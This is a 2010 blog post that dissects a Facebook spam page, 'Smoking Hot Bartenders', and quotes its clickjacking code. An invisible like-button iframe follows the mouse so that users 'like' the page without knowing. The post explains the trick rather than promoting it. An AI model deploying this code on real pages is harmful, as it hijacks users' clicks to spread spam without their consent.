---
author: Simon
comments: true
date: 2010-08-25 19:23:43+00:00
excerpt: How I got suckered into Liking "Smoking Hot Bartenders" on Facebook
layout: post
slug: smoking-hot-bartender-is-some-smoking-hot-facebook-spam
title: '"Smoking Hot Bartenders" is Some Smoking Hot Facebook Spam'
wordpress_id: 155
categories:
- Development
tags:
- Facebook Spam
- Wack
---

Yesterday I noticed a ton of my friends on Facebook were "liking" **‎:|:|:|:|:|:| Smoking Hot Bartenders :|:|:|:|:|:|**.  Noticing that even some friends who I would never think would like that (girls), I decided to click on it and take a look. 

[![](/assets/wp-content/uploads/2010/08/friends-like-hot-bartenders.png)](/assets/wp-content/uploads/2010/08/friends-like-hot-bartenders.png)

The "Smoking Hot Bartenders" site, of course, is some sort of spam site where the user is prompted to fill out some leadgen form (or offer) in order to access pictures of the "smoking hot bartenders". Declining to do so, I closed the window and figured that was that.

I was quite surprised to check my feed today and notice that I had "liked" the same page on Facebook. How did this happen?

I decided to take a look at the site, [http://cutebabesbartending.info/](http://cutebabesbartending.info/), and see how they were executing this very viral scheme.

The first thing you see when you land on the site, most likely from Facebook (and hence logged in), is a screen with some hot girls and a link to click through. This link is the key to the scheme.

[![](/assets/wp-content/uploads/2010/08/Screen-shot-2010-08-25-at-11.43.35-AM.png)](/assets/wp-content/uploads/2010/08/Screen-shot-2010-08-25-at-11.43.35-AM.png)

Taking a look the source of the page we see:
[html]
<h2>
    <a href="photos.html">Continue here to see photos</a>
</h2>
<div style="overflow: hidden; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="aaaa">       
  <iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fcutebabesbartending.info%2F&amp;layout=standard&amp;show_faces=true&amp;width=450&amp;action=like&amp;font&amp;colorscheme=dark&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:20px; height:20px;" allowTransparency="true" id="xxx" name="xxx"></iframe>
</div>
[/html]

Note we have here an absolutely positioned DIV with an IFRAME to the facebook like page. But where is the code that clicks the link? If they are triggering from the click why does this facebook like button fire? Check out the code below. Note that id **xxx** is the iframe itself, and **aaaa** is the facebook like button.

[html]
<script>
      var xxx = 0;
      var aaaa = document.getElementById('aaaa');    
      var standardbody=(document.compatMode=="CSS1Compat")? document.documentElement : document.body

      function lololol(e){
        if (window.event) {
          aaaa.style.top = (window.event.y-5)+standardbody.scrollTop+'px';
          aaaa.style.left = (window.event.x-5)+standardbody.scrollLeft+'px';
        } 
        else {
          aaaa.style.top = (e.pageY-5)+'px';
          aaaa.style.left = (e.pageX-5)+'px';
        }
      }
        document.onmousemove = function(e) {
          if (xxx == 0) {lololol(e);}
        }
</script>
[/html]

This is kind of ingenious: they are re-drawing the Facebook like button so it follows your mouse around the screen, and when you click on the link you click on both the like button and the link to the next page!

But why don't you see the like button? It's because the opacity of the parent element is set to 0 (ie completely transparent, thanks to commenter Colby Russell for correcting me). Let's change this and see what happens:
[![](/assets/wp-content/uploads/2010/08/smoking-hot-scam.png)](/assets/wp-content/uploads/2010/08/smoking-hot-scam.png)

Look at that Facebook like button there by my cursor! 

This is fairly brilliant spam - you click off of Facebook and unsuspectingly click on the link to get to the page where you assume there might be spam but you can ignore it. However, unbeknownst to you, you've already "liked" the spammy page, and it's now sitting in your feed waiting for the next sucker, er... friend, to click on it.

**Updated**: commenter [Ryan King](http://theryanking.com/) notes that the term for this spammy technique is [Clickjacking](http://en.wikipedia.org/wiki/Clickjacking).

